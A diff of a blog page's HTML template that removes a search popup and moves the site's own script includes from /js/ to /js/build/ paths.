+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
 </div>
-
-    </div>
-
-    <div class="image-viewer-container">
-    <img src="">
-</div>
-
-
-    
-        <div class="search-pop-overlay">
-    <div class="popup search-popup">
-        <div class="search-header">
-          <span class="search-input-field-pre">
-            <i class="fa-solid fa-keyboard"></i>
-          </span>
-            <div class="search-input-container">
-                <input autocomplete="off"
-                       autocorrect="off"
-                       autocapitalize="off"
-                       placeholder="Search..."
-                       spellcheck="false"
-                       type="search"
-                       class="search-input"
-                >
-            </div>
-            <span class="popup-btn-close">
-                <i class="fa-solid fa-times"></i>
-            </span>
-        </div>
-        <div id="search-result">
-            <div id="no-result">
-                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
-            </div>
-        </div>
-    </div>
-</div>
-
-    
+	
 
 </main>
 
 
-    
-<script src="/js/libs/Swup.min.js"></script>
 
-<script src="/js/libs/SwupSlideTheme.min.js"></script>
+<script src="/js/build/libs/Swup.min.js"></script>
 
-<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
 
-<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
 
-<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
 
-<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
 
 <script>
     const swup = new Swup({
@@ -1132,48 +1106,46 @@
 
 
 
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
 
+<script src="/js/build/utils.js" type="module"></script>
 
+<script src="/js/build/main.js" type="module"></script>
 
-<script src="/js/tools/imageViewer.js" type="module"></script>
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
 
-<script src="/js/utils.js" type="module"></script>
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
 
-<script src="/js/main.js" type="module"></script>
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
 
-<script src="/js/layouts/navbarShrink.js" type="module"></script>
-
-<script src="/js/tools/scrollTopBottom.js" type="module"></script>
-
-<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
-
-<script src="/js/layouts/categoryList.js" type="module"></script>
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
 
 
 
     
-<script src="/js/tools/localSearch.js" type="module"></script>
+<script src="/js/build/tools/localSearch.js" type="module"></script>
 
 
 
 
     
-<script src="/js/tools/codeBlock.js" type="module"></script>
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
 
 
 
 
     
-<script src="/js/layouts/lazyload.js" type="module"></script>
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
 
 
 
 
     
-<script src="/js/tools/runtime.js"></script>
+<script src="/js/build/tools/runtime.js"></script>
 
     
-<script src="/js/libs/odometer.min.js"></script>
+<script src="/js/build/libs/odometer.min.js"></script>
 
     
 <link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
@@ -1182,10 +1154,10 @@
 
 
   
-<script src="/js/libs/Typed.min.js"></script>
+<script src="/js/build/libs/Typed.min.js"></script>
 
   
-<script src="/js/plugins/typed.js" type="module"></script>
+<script src="/js/build/plugins/typed.js" type="module"></script>
 
 
 
@@ -1195,18 +1167,28 @@
 
 
 
-<div class="post-scripts" data-swup-reload-script>
-    
-        
-<script src="/js/tools/tocToggle.js" type="module"></script>
 
-<script src="/js/layouts/toc.js" type="module"></script>
-
-<script src="/js/plugins/tabs.js" type="module"></script>
 
     
-</div>
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
 
 
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
 </body>
+
 </html>
